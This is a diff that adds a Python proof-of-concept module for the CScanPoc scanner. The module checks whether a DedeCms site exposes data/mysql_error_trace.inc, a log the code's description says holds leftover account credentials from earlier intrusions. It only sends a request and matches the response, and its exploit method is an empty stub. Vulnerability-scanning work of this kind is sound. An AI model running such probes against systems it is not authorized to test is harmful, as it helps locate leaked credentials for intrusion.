@@ -1,0 +1,50 @@
+# coding: utf-8
+
+from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
+hh = hackhttp.hackhttp()
+
+class Vuln(ABVuln):
+    vuln_id = 'dedecms_0007' # 平台漏洞编号，留空
+    name = 'DedeCms data/mysql_error_trace.inc 敏感信息泄露' # 漏洞名称
+    level = VulnLevel.MED # 漏洞危害级别
+    type = VulnType.INFO_LEAK # 漏洞类型
+    disclosure_date = '2014-11-20'  # 漏洞公布时间
+    desc = '''
+        DEDE mysql_error_trace.inc 日志里面残留被入侵过的账号和密码
+    ''' # 漏洞描述
+    ref = 'https://www.genban.org/news/dedecms-4653.html' # 漏洞来源
+    cnvd_id = '' # cnvd漏洞编号
+    cve_id = '' #cve编号
+    product = 'dedecms'  # 漏洞应用名称
+    product_version = ''  # 漏洞应用版本
+
+
+class Poc(ABPoc):
+    poc_id = '361c3e99-09de-4469-ac5a-e419814bebec'
+    author = '国光'  # POC编写者
+    create_date = '2018-05-13' # POC创建时间
+
+    def __init__(self):
+        super(Poc, self).__init__(Vuln())
+
+    def verify(self):
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+            payload = '/data/mysql_error_trace.inc'
+            url = '{target}'.format(target=self.target)+payload
+            _, _, body, _, _ = hh.http(url)
+                       
+            if body and body.find('<?php  exit();') != -1:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
+
+    def exploit(self):
+        super(Poc, self).exploit()
+
+
+if __name__ == '__main__':
+    Poc().run()
